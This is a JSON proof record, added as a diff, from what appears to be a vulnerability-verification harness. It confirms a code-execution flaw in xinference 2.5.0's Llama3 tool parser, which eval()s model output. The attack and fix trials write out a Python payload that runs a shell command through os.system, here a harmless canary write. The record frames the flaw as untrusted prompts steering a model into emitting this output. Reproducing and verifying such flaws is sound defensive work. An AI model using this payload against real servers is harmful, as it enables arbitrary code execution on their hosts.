@@ -1,0 +1,263 @@
+{
+  "schema": "chainlab-proof/0",
+  "finding_id": "xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m",
+  "sink": "xinference/model/llm/tool_parsers/llama3_tool_parser.py:Llama3ToolParser.extract_tool_calls -> eval(model_output, {}, {})",
+  "sink_class": "code-exec",
+  "network": "none",
+  "chainlab_cve": "CVE-2026-61539",
+  "chainlab_ghsa": "GHSA-x2rj-828p-hx9m",
+  "chainlab_advisory_url": "https://github.com/xorbitsai/inference/security/advisories/GHSA-x2rj-828p-hx9m",
+  "chainlab_rd_class": "prompt-injection-to-tool",
+  "chainlab_attacker": "untrusted-llm-input",
+  "chainlab_scripted_model": {
+    "interface": "the raw model completion string fed to Llama3ToolParser.extract_tool_calls (the framework's own tool-call parsing entry point for Transformers-backend chat results)",
+    "plugged_into": "Llama3ToolParser().extract_tool_calls(<scripted model output>)",
+    "behavior": "returns the attacker-chosen completion verbatim; the parser eval()s it. Proves the serving framework lacks a guard independent of which model produced the text.",
+    "may_assume": "that some untrusted prompt could steer a real model into emitting this completion -- an in-shape Llama3 tool-call payload, i.e. a Python expression, which is exactly what this parser eval()s; nothing more",
+    "may_not_assume": "no auth bypass beyond the documented default (auth off by default per the advisory), no network, no attacker-controlled config or secret; only that the model's text reaches the parser"
+  },
+  "chainlab_framework": {
+    "name": "xinference",
+    "vuln_version": "2.5.0",
+    "fix_version": "2.7.0",
+    "repo": "https://github.com/xorbitsai/inference"
+  },
+  "harness_version": "0.1.0",
+  "spec_version": "1",
+  "started_utc": "2026-11-25T05:02:16+00:00",
+  "trials_per_arm": 5,
+  "versions": {
+    "xinference_vuln": "2.5.0",
+    "xinference_fix": "2.7.0",
+    "image_vuln": "sha256:a4eae120f8c4e2d86d5e6d149871eb8f81d4e80b38e7e6f2bcc3fae63b2d2a05",
+    "image_fix": "sha256:232651552491d192f906a2bbe3cf379efc1bbafcba42b211dd0f9feec5124656",
+    "scripted_model_interface": "the raw model completion string fed to Llama3ToolParser.extract_tool_calls (the framework's own tool-call parsing entry point for Transformers-backend chat results)"
+  },
+  "chainlab_images": {
+    "vuln": {
+      "tag": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m:vuln",
+      "image_id": "sha256:a4eae120f8c4e2d86d5e6d149871eb8f81d4e80b38e7e6f2bcc3fae63b2d2a05",
+      "version": "2.5.0",
+      "version_verified": true,
+      "build_seconds": 107.1
+    },
+    "fix": {
+      "tag": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m:fix",
+      "image_id": "sha256:232651552491d192f906a2bbe3cf379efc1bbafcba42b211dd0f9feec5124656",
+      "version": "2.7.0",
+      "version_verified": true,
+      "build_seconds": 89.7
+    }
+  },
+  "arms": {
+    "attack": {
+      "trials": 5,
+      "canary_hits": 5,
+      "exfil": 0
+    },
+    "control": {
+      "trials": 5,
+      "canary_hits": 0,
+      "exfil": 0
+    },
+    "fix": {
+      "trials": 5,
+      "canary_hits": 0,
+      "exfil": 0
+    }
+  },
+  "chainlab_arms_detail": {
+    "attack": {
+      "image": "vuln",
+      "fixture": "attack",
+      "expected_hits": 5,
+      "ok": true,
+      "records": [
+        {
+          "trial": 1,
+          "nonce": "PSB61bce9101a29ea37",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_attack_1_394280",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB61bce9101a29ea37 > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 0,
+          "oracle_out": "canary matches nonce -> host code executed via eval()",
+          "hit": true
+        },
+        {
+          "trial": 2,
+          "nonce": "PSBc187b7cc3fda9f1d",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_attack_2_7b4953",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSBc187b7cc3fda9f1d > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 0,
+          "oracle_out": "canary matches nonce -> host code executed via eval()",
+          "hit": true
+        },
+        {
+          "trial": 3,
+          "nonce": "PSB2c2e0b8b757e8368",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_attack_3_6df098",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB2c2e0b8b757e8368 > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 0,
+          "oracle_out": "canary matches nonce -> host code executed via eval()",
+          "hit": true
+        },
+        {
+          "trial": 4,
+          "nonce": "PSB0d6153a5253b034e",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_attack_4_41dce7",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB0d6153a5253b034e > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 0,
+          "oracle_out": "canary matches nonce -> host code executed via eval()",
+          "hit": true
+        },
+        {
+          "trial": 5,
+          "nonce": "PSB07739310969e1a17",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_attack_5_94c23d",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB07739310969e1a17 > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 0,
+          "oracle_out": "canary matches nonce -> host code executed via eval()",
+          "hit": true
+        }
+      ]
+    },
+    "control": {
+      "image": "vuln",
+      "fixture": "control",
+      "expected_hits": 0,
+      "ok": true,
+      "records": [
+        {
+          "trial": 1,
+          "nonce": "PSB0ea071d3bfe268de",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_control_1_c93d08",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(None, 'get_weather', {'location': 'Tokyo'})]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 2,
+          "nonce": "PSBdf7aa4de303ca5b9",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_control_2_c5fba9",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(None, 'get_weather', {'location': 'Tokyo'})]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 3,
+          "nonce": "PSB9803eabc8849f61e",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_control_3_5be4d2",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(None, 'get_weather', {'location': 'Tokyo'})]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 4,
+          "nonce": "PSB27e643b94e3633f3",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_control_4_dba16c",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(None, 'get_weather', {'location': 'Tokyo'})]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 5,
+          "nonce": "PSB2c0251b9b723f9c7",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_control_5_f470c2",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(None, 'get_weather', {'location': 'Tokyo'})]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        }
+      ]
+    },
+    "fix": {
+      "image": "fix",
+      "fixture": "attack",
+      "expected_hits": 0,
+      "ok": true,
+      "records": [
+        {
+          "trial": 1,
+          "nonce": "PSB5f99020c197e616f",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_fix_1_9d6b11",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB5f99020c197e616f > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 2,
+          "nonce": "PSB6529f78cc79510f2",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_fix_2_323a81",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB6529f78cc79510f2 > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 3,
+          "nonce": "PSB69b22be7b109127a",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_fix_3_c1cf17",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB69b22be7b109127a > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 4,
+          "nonce": "PSB587ef5516cfc739c",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_fix_4_32642b",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB587ef5516cfc739c > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        },
+        {
+          "trial": 5,
+          "nonce": "PSB8641eec1ff9ac8cc",
+          "container": "pitsense_rd_chainlab_xinference-llama3-tool-parser-ghsa-x2rj-828p-hx9m_fix_5_b4f7b5",
+          "network_mode": "none",
+          "deliver_rc": 0,
+          "deliver_tail": "extract_tool_calls -> [(\"__import__('os').system('echo PSB8641eec1ff9ac8cc > /tmp/chainlab_canary')\", None, None)]",
+          "oracle_rc": 1,
+          "oracle_out": "no canary file -> no code execution",
+          "hit": false
+        }
+      ]
+    }
+  },
+  "fix_patches_claimed_sink": true,
+  "verdict": "PROVEN",
+  "finished_utc": "2026-11-25T05:06:30+00:00"
+}
